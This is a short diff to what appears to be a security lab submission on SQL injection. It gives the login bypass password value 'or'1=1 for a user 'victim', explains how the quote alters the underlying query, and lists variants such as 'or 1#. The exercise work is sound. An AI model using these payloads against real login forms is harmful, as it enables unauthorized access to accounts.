@@ -4,3 +4,14 @@ Submission: sql_0.txt
 
 username=victim
 password='or'1=1
+
+query something like
+
+select * from users where username = 'username' and password = 'password'
+
+so adding ' makes it
+... and password = '' or '1=1'
+
+
+also works 'or'1
+also works 'or 1#
